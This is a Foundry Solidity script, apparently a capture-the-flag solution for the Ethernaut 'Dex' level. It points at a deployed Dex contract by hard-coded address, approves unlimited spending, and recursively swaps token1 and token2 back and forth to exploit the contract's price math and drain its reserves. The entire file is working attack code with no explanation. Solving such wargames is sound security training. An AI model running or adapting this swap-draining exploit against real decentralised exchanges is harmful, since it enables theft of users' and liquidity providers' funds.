// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Dex.sol";

contract DexScript is Script {

    Dex target;
    address token1;
    address token2;
    uint256 count;

    function setUp() public {
        target = Dex(0x38a67811d1F25514dA1Cb2c7C93878C7e8aab2d4);
        token1 = target.token1();
        token2 = target.token2();
        
        console.log("intial token1 amount: ", target.balanceOf(token1, address(target)));
        console.log("intial token2 amount: ", target.balanceOf(token2, address(target)));
    }

    function run() public {
        vm.startBroadcast();
        
        target.approve(address(target), type(uint256).max);
        ex(token1, token2, 9);

        console.log("final token1 amount: ", target.balanceOf(token1, address(target)));
        console.log("final token2 amount: ", target.balanceOf(token2, address(target)));

        vm.stopBroadcast();
    }

    function ex(address from_, address to_, uint256 value_) public {
        if (count < 1) {
            count++;
            target.swap(from_, to_, 9);
            ex(to_, from_, target.balanceOf(to_, address(target)));
        }
        if (
            target.balanceOf(token1, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)) > target.balanceOf(token1, address(target))
            ||
            target.balanceOf(token2, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)) > target.balanceOf(token2, address(target))
        ) {
            if (
                target.balanceOf(token1, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)) >= 110
                ||
                target.balanceOf(token2, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)) >= 110
            ) {
                return;
            }
            target.swap(from_, to_, target.balanceOf(from_, address(target)));
            ex(to_, from_, target.balanceOf(from_, address(target)));
        } else {
            target.swap(from_, to_, target.balanceOf(from_, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)));
            ex(to_, from_, target.balanceOf(to_, address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)));
        }
    }
}